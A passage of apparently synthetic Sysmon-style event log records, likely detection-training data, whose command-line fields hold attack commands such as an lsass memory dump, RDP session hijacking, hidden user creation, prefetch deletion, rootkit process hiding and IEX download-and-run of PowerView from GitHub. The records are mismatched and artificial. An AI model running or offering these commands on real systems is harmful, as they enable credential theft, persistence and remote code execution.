        "UtcTime": "2024-05-17T01:36:51.575799Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-39.myers.com",
        "User": "dleonard",
        "ProcessID": 5393,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\" /v ProxyServer /t REG_SZ /d \\\"proxy.atomic-test.com:8080\\\" /f\\n\",",
        "LogonID": 421986,
        "LogonGuid": "4eb4e1a3-555a-49bf-8477-bc6736c16c74",
        "SourceProcessID": 1980,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\current..exe",
        "DestinationProcessID": 5681,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\night..exe",
        "UtcTime": "2024-05-17T01:36:51.575799Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-48.hodges-thomas.biz",
        "User": "michaelharmon",
        "ProcessID": 3895,
        "ProcessName": "malware.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe /out:#{output_file} \\\"#{input_file}\\\"\\n\",",
        "LogonID": 214411,
        "LogonGuid": "057de981-1e6f-4d60-90ad-a3a311fd9861",
        "SourceProcessID": 6994,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\industry..dll",
        "DestinationProcessID": 9468,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\choice..dll",
        "UtcTime": "2024-05-17T01:36:51.576807Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-10.gonzales-berger.net",
        "User": "janderson",
        "ProcessID": 5612,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Import-Module -Name AzureAD\\n$PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\nConnect-AzureAD -Credential $Credential\\n\\n$user = Get-AzureADUser -Filter \\\"DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'\\\"\\nif ($user -eq $null) { Write-Warning \\\"User not found\\\"; exit }\\n$role = Get-AzureADDirectoryRole -Filter \\\"DisplayName eq '#{role_name}'\\\"\\nif ($role -eq $null) { Write-Warning \\\"Role not found\\\"; exit }\\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId\\nWrite-Host \\\"User $($user.DisplayName) was added to $($role.DisplayName) role\\\"\\n\",",
        "LogonID": 281842,
        "LogonGuid": "b1b32b84-da56-416a-820a-8763b4e98e24",
        "SourceProcessID": 2930,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\natural..exe",
        "DestinationProcessID": 2872,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\push..exe",
        "UtcTime": "2024-05-17T01:36:51.576807Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-75.boyer-banks.org",
        "User": "jasmine96",
        "ProcessID": 9259,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"New-Item -Path #{teamviewer_log_file} -Force | Out-Null\\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\\n\",",
        "LogonID": 991771,
        "LogonGuid": "2262f766-2aba-436e-acc5-7d77a71a15de",
        "SourceProcessID": 1635,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\professor..dll",
        "DestinationProcessID": 8406,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\knowledge..dll",
        "UtcTime": "2024-05-17T01:36:51.576807Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-37.brady-wood.info",
        "User": "nicholas85",
        "ProcessID": 3286,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"reg add \\\"HKCU\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\OOBE\\\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 782405,
        "LogonGuid": "a91bede7-ef30-45fc-b570-6fa70ff364b5",
        "SourceProcessID": 2277,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\its..dll",
        "DestinationProcessID": 9544,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\treatment..dll",
        "UtcTime": "2024-05-17T01:36:51.576807Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-42.ross-moore.com",
        "User": "gallegosanne",
        "ProcessID": 1619,
        "ProcessName": "malware.exe",
        "CommandLine": "\"docker build -t t1610 $PathtoAtomicsFolder/T1610/src/\\ndocker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh\\n\",",
        "LogonID": 226974,
        "LogonGuid": "442061e9-f75f-43f0-a4ad-d5beeb969e33",
        "SourceProcessID": 8351,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\arm..dll",
        "DestinationProcessID": 4218,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\still..exe",
        "UtcTime": "2024-05-17T01:36:51.576807Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-59.potter.com",
        "User": "billycook",
        "ProcessID": 4542,
        "ProcessName": "malware.exe",
        "CommandLine": "\"cscript \\\"#{jscript}\\\" > %tmp%\\\\T1059.007.out.txt\\n\",",
        "LogonID": 428133,
        "LogonGuid": "d01e89d8-3f5c-4426-80f6-f8269ec945df",
        "SourceProcessID": 8095,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\give..dll",
        "DestinationProcessID": 2626,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\computer..dll",
        "UtcTime": "2024-05-17T01:36:51.577798Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-81.ellis.net",
        "User": "joy84",
        "ProcessID": 3690,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"query user\\nsc.exe create sesshijack binpath= \\\"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\\\"\\nnet start sesshijack\\n\",",
        "LogonID": 287580,
        "LogonGuid": "5e1a3f6d-eadf-44da-b199-e4f937fe6c4b",
        "SourceProcessID": 5911,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\include..exe",
        "DestinationProcessID": 9185,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\officer..exe",
        "UtcTime": "2024-05-17T01:36:51.577798Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-25.anderson.com",
        "User": "veronicarichards",
        "ProcessID": 8130,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$exePath =  resolve-path \\\"$env:ProgramFiles\\\\dotnet\\\\shared\\\\Microsoft.NETCore.App\\\\5*\\\\createdump.exe\\\"\\n& \\\"$exePath\\\" -u -f $env:Temp\\\\dotnet-lsass.dmp (Get-Process lsass).id\\n\",",
        "LogonID": 632266,
        "LogonGuid": "93fc0086-9458-42fa-91a6-b68b5b88361e",
        "SourceProcessID": 1675,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\read..dll",
        "DestinationProcessID": 9706,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\newspaper..dll",
        "UtcTime": "2024-05-17T01:36:51.577798Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-38.davis-williams.com",
        "User": "cervantesjessica",
        "ProcessID": 7473,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"invoke-expression 'cmd /c start powershell -Command {cmd /c \\\"#{TorExe}\\\"}'\\nsleep -s 60\\nstop-process -name \\\"tor\\\" | out-null\\n\",",
        "LogonID": 515417,
        "LogonGuid": "eb839d9f-d954-40a8-865f-4684fce35c42",
        "SourceProcessID": 1663,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\technology..exe",
        "DestinationProcessID": 9337,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\fast..exe",
        "UtcTime": "2024-05-17T01:36:51.577798Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-00.mcpherson.com",
        "User": "ofields",
        "ProcessID": 3818,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Remove-Item -Path (Join-Path \\\"$Env:SystemRoot\\\\prefetch\\\\\\\" (Get-ChildItem -Path \\\"$Env:SystemRoot\\\\prefetch\\\\*.pf\\\" -Name)[0])\\n\",",
        "LogonID": 272918,
        "LogonGuid": "26054769-f354-4baa-bc6d-991dd7d8f4ec",
        "SourceProcessID": 3875,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\final..exe",
        "DestinationProcessID": 4436,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\management..dll",
        "UtcTime": "2024-05-17T01:36:51.577798Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-10.walsh.com",
        "User": "mackcindy",
        "ProcessID": 2704,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"net user $ ATOMIC123! /add /active:yes\",",
        "LogonID": 391225,
        "LogonGuid": "ba98eba1-eea8-45a5-9a3d-c07231274910",
        "SourceProcessID": 7354,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\end..exe",
        "DestinationProcessID": 2259,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\must..dll",
        "UtcTime": "2024-05-17T01:36:51.578800Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-68.banks.com",
        "User": "ybrown",
        "ProcessID": 5925,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\CredSSP\\\\Parameters\\\" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\\n\",",
        "LogonID": 366011,
        "LogonGuid": "7ff115ef-13e0-4188-b656-ff4b4b3e499c",
        "SourceProcessID": 9388,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\gun..exe",
        "DestinationProcessID": 5201,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\anything..exe",
        "UtcTime": "2024-05-17T01:36:51.578800Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-61.mcintyre-mccoy.biz",
        "User": "bennettfelicia",
        "ProcessID": 7786,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo modprobe #{rootkit_name}\\nping -c 10 localhost >/dev/null & TARGETPID=\\\"$!\\\"\\nps $TARGETPID\\nkill -31 $TARGETPID\\nps $TARGETPID || echo \\\"process ${TARGETPID} hidden\\\"\\n\",",
        "LogonID": 248596,
        "LogonGuid": "164f07fe-2100-408d-8770-123890cc4b86",
        "SourceProcessID": 3138,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\hotel..dll",
        "DestinationProcessID": 5996,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\method..exe",
        "UtcTime": "2024-05-17T01:36:51.578800Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-21.adams.biz",
        "User": "alexandria63",
        "ProcessID": 5290,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\CreateThreadNative.exe -debug\\n\",",
        "LogonID": 806402,
        "LogonGuid": "b2e57ce7-0abc-4166-bde5-e5c86875de6b",
        "SourceProcessID": 2540,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\present..dll",
        "DestinationProcessID": 2131,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\despite..dll",
        "UtcTime": "2024-05-17T01:36:51.578800Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-20.spencer.com",
        "User": "johnsonjose",
        "ProcessID": 6011,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\\"PathToAtomicsFolder\\\\T1055.012\\\\src\\\\T1055.012-macrocode.txt\\\" -officeProduct \\\"#{ms_product}\\\" -sub \\\"Exploit\\\"\\n\",",
        "LogonID": 500669,
        "LogonGuid": "199e371f-796a-4be9-ab0b-3c1b2029a7c9",
        "SourceProcessID": 4247,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\easy..exe",
        "DestinationProcessID": 1308,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\while..exe",
        "UtcTime": "2024-05-17T01:36:51.578800Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-83.sanders.com",
        "User": "dgarcia",
        "ProcessID": 2858,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"powershell -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\\\"\",",
        "LogonID": 443481,
        "LogonGuid": "f723ec4d-02d9-4303-bd5d-bf33b4f41e24",
        "SourceProcessID": 8175,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\speech..dll",
        "DestinationProcessID": 9854,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\with..exe",
        "UtcTime": "2024-05-17T01:36:51.579799Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-88.austin-golden.com",
        "User": "ifranklin",
        "ProcessID": 8215,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}\",",
        "LogonID": 459324,
        "LogonGuid": "125a2945-d318-42b8-b2b5-18cd3ed2ec07",
        "SourceProcessID": 6625,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\amount..exe",
        "DestinationProcessID": 6787,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\open..exe",
        "UtcTime": "2024-05-17T01:36:51.579799Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-94.burgess.com",
        "User": "ronald93",
        "ProcessID": 6568,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"nscurl -k \\\"#{remote_file}\\\" -o \\\"#{destination_path}\\\"\",",
        "LogonID": 285729,
        "LogonGuid": "efec7306-4ad7-4a9a-9e98-ecd2054f5707",
        "SourceProcessID": 1039,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\difficult..dll",
        "DestinationProcessID": 9385,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\agreement..dll",
        "UtcTime": "2024-05-17T01:36:51.579799Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-53.weber.com",
        "User": "stephaniecrosby",
        "ProcessID": 8739,
        "ProcessName": "malware.exe",
        "CommandLine": "\"chmod -R #{symbolic_mode} #{file_or_folder}\\n\",",
        "LogonID": 697965,
        "LogonGuid": "1cdfd6fc-d0a1-455c-9e2d-8f353fa09055",
        "SourceProcessID": 8130,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\reduce..exe",
        "DestinationProcessID": 6380,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\occur..dll",
        "UtcTime": "2024-05-17T01:36:51.579799Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-06.hamilton.net",
        "User": "clucas",
        "ProcessID": 8454,
        "ProcessName": "malware.exe",
        "CommandLine": "\"DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\\n\",",
        "LogonID": 540213,
        "LogonGuid": "71c316f5-d113-4bd9-a452-7f2f5f83b996",
        "SourceProcessID": 9880,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\history..dll",
        "DestinationProcessID": 2693,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\beautiful..exe",
        "UtcTime": "2024-05-17T01:36:51.579799Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-74.rowe.com",
        "User": "davidgreen",
        "ProcessID": 7396,
        "ProcessName": "nc.exe",
        "CommandLine": "\"REG ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Minimal\\\\AtomicSafeMode\\\" /VE /T REG_SZ /F /D \\\"Service\\\"\\n\",",
        "LogonID": 778679,
        "LogonGuid": "bebfff4b-35d2-44a7-b7f2-ed70b56453d2",
        "SourceProcessID": 5606,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\give..dll",
        "DestinationProcessID": 6594,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\value..dll",
        "UtcTime": "2024-05-17T01:36:51.580802Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-79.johnson.info",
        "User": "smithmatthew",
        "ProcessID": 1066,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"reg add \\\"HKCU\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\OOBE\\\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 184741,
        "LogonGuid": "621644b2-71dd-45c7-95ce-d484f8218125",
        "SourceProcessID": 3698,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\type..exe",
        "DestinationProcessID": 9888,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\truth..exe",
        "UtcTime": "2024-05-17T01:36:51.580802Z"
    },
